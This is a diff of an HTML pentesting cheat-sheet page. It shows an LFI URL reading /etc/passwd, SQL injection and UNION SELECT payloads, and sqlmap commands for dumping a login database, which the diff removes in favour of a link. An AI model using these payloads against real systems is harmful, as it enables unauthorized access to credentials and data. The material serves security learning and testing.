@@ -103,13 +103,12 @@ http://...index.php?language=/etc/passwd%00.php</code></pre>
     ' OR 1=1 --
     ' OR 1'='1
     ' --</code></pre>
-                    <h3>Automate using SQLmap</h3>
-                    <ul> 
-                    <p>Some basic commands</p>
-                    <pre><code class="language-bashd">sqlmap -u http://domain.com/login --data "email=hola&password=test" --dbs                   #Show database
-sqlmap -u http://domain.com/login --data "email=hola&password=test" -D main --tables        #Show tables from main database
-sqlmap -u http://domain.com/login --data "email=hola&password=test" -D main -T user --dump  #Show all info from that table</code></pre>
-                    </ul>
+                    <h3>Automate using sqlmap</h3>
+                    <div class="banner">
+                        <a class="cherry-banner" href="/H4ckV4ult/pages/protocols/sqlmap.html">
+                            <h2>  Check for more information ↗️</h2>
+                        </a>
+                    </div> 
 
                     <h3>Union select payloads</h3>
                     <ul>
@@ -175,7 +174,7 @@ cn' UNION SELECT 1,variable_name,variable_value,5 FROM information_schema.global
                         no error would mean that this parameter is injectable   
                         <pre><code class="language-sql">'+UNION+SELECT+NULL+'text'--</code></pre>
                     </ul>    
-                    </ul>
+                    <ul>
                     
                     <h2 id="LDAP injection">LDAP injection</h2>
                     <ul>
